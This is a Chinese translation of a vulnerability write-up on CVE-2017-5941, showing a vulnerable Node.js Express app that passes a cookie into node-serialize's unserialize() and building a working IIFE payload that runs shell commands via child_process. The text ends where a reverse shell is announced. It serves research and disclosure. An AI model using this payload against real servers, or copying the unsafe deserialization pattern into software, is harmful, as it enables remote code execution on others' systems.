# 【漏洞分析】利用Node.js反序列化的漏洞执行远程代码（含演示视频）
|
##### 译文声明
本文是翻译文章，文章来源：exploit-db.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
翻译：[阻圣](http://bobao.360.cn/member/contribute?uid=134615136)
预估稿费：100RMB
投稿方式：发送邮件至[linwei#360.cn](mailto:PI:EMAIL)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿
**漏洞介绍**
**漏洞名称：** Exploiting Node.js deserialization bug for Remote Code Execution
**漏洞CVE id：** CVE-2017-5941
**漏洞类型：** 代码执行
**漏洞简介：**
不可信的数据传入了unserialize()函数，这导致我们可以通过传递带有立即调用函数表达式（IIFE）的JavaScript对象来实现任意代码执行。
**漏洞详情**
在Node.js代码审查期间，我碰巧看到了一个序列化/反序列化模块命名为node-serialize。cookie的值来自请求然后被传递到模块提供的unserialize()函数。下面是一个示例的node.js应用程序：
    var express = require('express');
    var cookieParser = require('cookie-parser');
    var escape = require('escape-html');
    var serialize = require('node-serialize');
    var app = express();
    app.use(cookieParser())
    app.get('/', function(req, res){
        if (req.cookies.profile) {
            var str = new Buffer(req.cookies.profile,'base64').toStrin();
            var obj = serialize.unserialize(str);
        if (obj.username){
        res.send("Hello " + escape(obj.username));
        }
    }else{
    res.cookie('profile',"eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5Ijo
    iYmFuZ2Fsb3JlIn0=",{ maxAge: 900000, httpOnly: true});
    }
    res.send("Hello World");
    });
    app.listen(3000);
Java，PHP，Ruby和Python也有着大量的反序列化问题
[Understanding PHP Object
Injection](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)
[Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
[Rails Remote Code Execution Vulnerability
Explained](http://blog.codeclimate.com/blog/2013/01/10/rails-remote-code-execution-vulnerability-explained/)
[Arbitrary code execution with Python
pickles](https://www.cs.uic.edu/~s/musings/pickle/)
但是我找不到任何解释反序列化/对象的资源来解释Node.js中的注入BUG。
**Building the Payload**
我使用node-serialize version
0.0.4进行研究，为了成功利用当不可信数据传递到unserialize()函数时，执行任意代码。创建Payload的最好方法就是使用同一模块的serialize()函数。
我创建了以下JavaScript对象并将其传递给serialize()函数。
    var y = {
    rce : function(){
    require('child_process').exec('ls /', function(error,
    stdout, stderr) { console.log(stdout) });
    },
    }
    var serialize = require('node-serialize');
    console.log("Serialized: n" + serialize.serialize(y));
输出如下：
现在我们有一个序列化的字符串，可以通过unserialize()函数进行反序列化，但问题是代码执行不会发生，直到你触发对应于对象的rce属性的函数。后来我想出，我们可以使用JavaScript的立即调用函数表达式（IIFE）来调用该函数。如果我们在函数体之后使用括号()，当对象被创建时，函数将被调用。
它的工作方式类似于C ++中的类构造函数。
代码：
    var y = {
    rce : function(){
    require('child_process').exec('ls /', function(error,
    stdout, stderr) { console.log(stdout) });
    }(),
    }
    var serialize = require('node-serialize');
    console.log("Serialized: n" + serialize.serialize(y));
获得以下输出
IIFE工作正常，但序列化失败。所以我试图在以前序列化的字符串的函数体后添加括号()。并将其传递给unserialize()函数，幸运的它成功了。所以我们有Exploit
Payload：
    {"rce":"_$$ND_FUNC$$_function (){n t
    require('child_process').exec('ls /', function(error, stdout, stderr) {
    console.log(stdout) });n }()"}
将它传递给unserialize()函数将导致代码执行。
    var serialize = require('node-serialize');
    var payload = '{"rce":"_$$ND_FUNC$$_function
    (){require('child_process').exec('ls /',
    function(error, stdout, stderr) { console.log(stdout)
    });}()"}';
    serialize.unserialize(payload);
演示：
现在我们知道我们可以利用node-serialize模块中的unserialize()函数。现在让我们来利用漏洞生成一个反向shell。